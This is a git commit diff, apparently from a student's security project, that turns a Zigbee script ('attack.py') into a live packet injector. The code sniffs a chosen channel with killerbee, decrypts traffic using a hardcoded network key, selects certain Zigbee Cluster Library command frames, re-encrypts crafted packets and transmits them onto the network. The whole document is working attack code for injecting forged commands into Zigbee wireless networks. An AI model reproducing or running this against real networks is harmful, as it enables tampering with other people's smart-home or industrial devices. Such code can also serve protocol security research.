f876044c7fb97e5a6a76197b5dc829543110ee8d
Jelmer <j.lap@student.tue.nl>
2022-06-17 05:18:38 -0400

    Maybe working attack

--- attack.py
+++ attack.py
@@ -1,6 +1,12 @@
 from unicodedata import decimal
 from scapy import *
 from killerbee.scapy_extensions import *
+import argparse
+
+parser = argparse.ArgumentParser(description="Zigbee packet injector")
+parser.add_argument("-c", type=int, dest="channel", choices=range(11, 25) , default=11)
+
+args = parser.parse_args()
 
 key = bytes.fromhex("c7398de1956fbe125d3463a58f1e3a3c")
 
@@ -17,13 +23,14 @@ def craftPacket(pkt, data):
     return kbencrypt(pkt, data, key)
 
 
-for pkt in pkts:
+while True:
+    pkt = kbsniff(args.channel)
     if pkt.haslayer("ZigbeeSecurityHeader"):
         dec = kbdecrypt(pkt, key)
         if dec.haslayer("ZigbeeClusterLibrary") and dec.getlayer("ZigbeeClusterLibrary").command_identifier == 0x01: 
             pkt.show()
             newPkt = craftPacket(pkt, dec)
             newPkt.show()
-            kbdecrypt(newPkt, key).show()
+            kbsendp(newPkt, args.channel)
 
     
